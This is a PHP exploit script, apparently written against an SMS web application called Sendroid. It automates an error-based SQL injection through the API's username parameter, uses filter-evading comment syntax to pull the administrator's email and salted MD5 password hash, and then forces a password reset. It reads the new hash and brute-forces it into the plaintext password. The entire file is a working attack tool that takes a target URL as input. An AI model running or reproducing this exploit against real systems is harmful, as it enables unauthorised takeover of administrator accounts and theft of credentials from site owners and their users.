<?php
/**
* A script to authomatically get admin password
* 
* @author: Onwuka Gideon <dongidomed[@]gmail[.]com>
* 
*/
 
parse_str(implode('&', array_slice($argv, 1)), $_GET);
 
$queries =[
    "sql_get_email" => "/*!12345SELECT*/+email+FROM+users+WHERE+username='admin'",
    "sql_get_password0" => "/*!12345SELECT*/+SUBSTRING(password,1,32)+FROM+users+WHERE+username='admin'",
    "sql_get_password1" => "/*!12345SELECT*/+SUBSTRING(password,33)+FROM+users+WHERE+username='admin'",
];
 
$payload = "/API/index.php?action=compose&username=asdasd%27)%20OR%20(SELECT%203321%20FROM(SELECT%20COUNT(*),CONCAT+((<query>),FLOOR(RAND(0)*2))x%20FROM%20/*!INFORMATION_SCHEMA*/.PLUGINS%20GROUP%20BY%20x)a)--%20RPjw&api_key=sdsd&sender";
// 
 
checkCommands();
 
print_r(getEmailAndPassword($_GET['url'], $payload, $queries));
 
 
/**
*
* Checks if minimum expected command is issued 
* 
* @param: $_GET
* @return; Boolean 
**/
 
 
function checkCommands(){
     
    //url  && shell
    $url = $_GET['url'] ?? "";
     
    if( $url == "" ) {
 
        "Please enter a target";
 
        help();
        exit(1);
    }
}
 
// Print help message
function help(){
 
    echo "Invalid command " . PHP_EOL;
    echo "eg php -f sendroid_exploit.php url=https://localhost/sms" . PHP_EOL;
    echo "" . PHP_EOL;
}
 
 
// ==
// == Reset password and Get the Password hash
// ==
function getEmailAndPassword($url, $payload, $queries){
    
   //>> Fetch admin email
   echo "Fetching admin email....:";
     $sql_get_email = $url . str_replace("<query>", $queries['sql_get_email'], $payload);
     $email = extractValue(makeRequest($sql_get_email));
   echo $email . PHP_EOL.PHP_EOL;
   //<< EndFetch admin email
 
   //>> Fetch admin old pass
   echo "Fetching admin old password...:";
     $sql_old_password0 = $url . str_replace("<query>", $queries['sql_get_password0'], $payload);
     $sql_old_password1 = $url . str_replace("<query>", $queries['sql_get_password1'], $payload);
     $old_password = extractValue(makeRequest($sql_old_password0), 'password') . extractValue(makeRequest($sql_old_password1), 'password');
   echo $old_password . PHP_EOL.PHP_EOL;
   //<< End Fetch admin old
 
   // Now we have the old password and admin email
   // reset password
   echo "Resetting password...:"; 
     $forgot_password = $url . "/administrator/index.php?reset&p";
     makeRequest($forgot_password, "POST", ["userEmail" => $email]);
   echo " Done!" . PHP_EOL.PHP_EOL;
 
   //>> Fetch admin new password
   echo "Getting new password...:";
     $sql_new_password0 = $url . str_replace("<query>", $queries['sql_get_password0'], $payload);
     $sql_new_password1 = $url . str_replace("<query>", $queries['sql_get_password1'], $payload);
     $new_password = extractValue(makeRequest($sql_new_password0), 'password') . extractValue(makeRequest($sql_new_password1), 'password');
   echo $new_password . PHP_EOL.PHP_EOL;
   //<< End Fetch admin new password
 
   //>> Cracking password
   echo "Craking password...:";
     $password = crackPassword($new_password);
   echo $password . PHP_EOL.PHP_EOL;
   //<< Cracking password
 
   // return $sql_get_email;
   return ["email" => $email, "password" => $password];
}
 
//
// POST and GET request
// ==
function makeRequest($url, $method = "GET", $parameter = []){
 
    // Get cURL resource
    $curl = curl_init();
    // Set some options - we are passing in a useragent too here
    if( strtolower($method) == "post" ){
        curl_setopt_array($curl, [
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_URL => $url,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 0_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36',
            CURLOPT_POST => 1,
            CURLOPT_POSTFIELDS => $parameter
        ]);
    }
    else{
 
        curl_setopt_array($curl, [
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_URL => $url,
            CURLOPT_USERAGENT => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 0_0_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36'
        ]);
    }
    // Send the request & save response to $resp
    $resp = curl_exec($curl);
    // Close request to clear up some resources
    curl_close($curl);
 
    return $resp;
}
 
// Extract the real value 
function extractValue($payload, $what = "email"){
    
   $patterns = []; $patterns[0] = "/ for key 'group_key'/"; $patterns[1] = "/Duplicate entry /"; $patterns[2] = "/\s\s+/"; $patterns[3] = "/'/";  
   $replacements = [];  $replacement[0] = ""; $replacements[1] = ""; $replacements[2] = ""; $replacements[3] = "";
    
   $result = preg_replace($patterns, $replacements, $payload);
      
    return substr($result, 0, -1);
}
 
 
function crackPassword($password){
     
   echo " cracking... please wait... ";
 
   $pwsalt = explode( ":",$password );  
 
   for ($i=1; $i < 20000000000000 ; $i++) { 
 
     if(md5($i . $pwsalt[1]) == $pwsalt[0] ) {  
 
       return $i;
     }
 
   }
 
   return "Could not crack password";
}